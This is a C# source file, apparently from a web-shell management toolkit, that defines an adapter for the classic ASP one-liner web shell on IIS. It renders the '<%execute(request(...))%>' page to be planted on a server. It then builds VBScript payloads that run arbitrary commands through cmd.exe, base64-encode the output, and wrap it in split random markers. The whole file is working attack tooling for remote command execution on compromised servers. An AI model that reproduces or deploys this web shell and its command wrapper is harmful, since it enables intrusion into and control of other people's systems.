using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The universal one-liner classic-ASP family: the placed page is the
/// classic <c>&lt;%execute(request("..."))%&gt;</c> line -- the
/// statement-running variant of the one-liner every manager knows on IIS
/// legacy (the <c>eval</c> variant evaluates expressions only, which
/// cannot carry a working wrapper). Each request's value is the VBScript
/// wrapper itself: the command rides escaped inside the platform shell's
/// exec, both output streams are read, and the wrapper frames its answer
/// with the family's marker halves around a base64-encoded body (the
/// MSXML bin.base64 trick, the documented way classic ASP encodes).
///
/// Classic ASP runs on IIS, so the wrapper runs the command through
/// cmd.exe. No function-fallback chains and no bypass logic: those belong
/// to out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class EvalAspAdapter : EvalWebShellAdapterBase
{
    public override string Id => "eval-asp";
    public override string ScriptLanguage => "asp";

    protected override (string Prefix, string Suffix) PasswordLiteral => ("request(\"", "\")");

    public override string RenderScript(string password)
        => "<%execute(request(\"" + password + "\"))%>";

    public override WebShellRequest EncodeCommand(
        string url,
        string password,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != "base64")
            throw new NotSupportedException($"The {Id} adapter implements the base64 encoder, not '{encoder}'.");
        if (decoder is not ("base64" or "default"))
            throw new NotSupportedException($"The {Id} adapter implements the base64 and default decoders, not '{decoder}'.");

        var tagStart = WebShellAdapters.RandomToken(6, 12);
        var tagEnd = WebShellAdapters.RandomToken(6, 12);

        // The command rides VBScript-escaped (quotes doubled) inside the
        // exec -- classic ASP has no base64 decoder worth the bytes, so
        // escaping is the wrapper's quoting story.
        var escaped = command.Replace("\"", "\"\"");

        // The wrapper's own text: one statement line, colon-separated --
        // the platform shell's exec with both streams read, the UTF-8
        // bytes base64-encoded through the MSXML trick, and the markers
        // written as concatenated halves so the wrapper never contains
        // either whole.
        var wrapper =
            "Set S=CreateObject(\"WScript.Shell\")"
            + ":Set E=S.Exec(\"cmd.exe /c " + escaped + "\")"
            + ":O=E.StdOut.ReadAll&E.StdErr.ReadAll"
            + ":Set T=CreateObject(\"ADODB.Stream\")"
            + ":T.Type=2:T.Charset=\"utf-8\":T.Open:T.WriteText O"
            + ":T.Position=0:T.Type=1:T.Position=3"
            + ":Set X=CreateObject(\"MSXML2.DOMDocument\").createElement(\"x\")"
            + ":X.dataType=\"bin.base64\":X.nodeTypedValue=T.Read"
            + ":Response.Write \"" + Half(tagStart) + "\"&\"" + HalfBack(tagStart) + "\""
            + "&X.text"
            + "&\"" + Half(tagEnd) + "\"&\"" + HalfBack(tagEnd) + "\""
            + ":Response.End";

        var form = new Dictionary<string, string>
        {
            [password] = wrapper,
        };
        return new WebShellRequest(url, form, tagStart, tagEnd, password);
    }
}
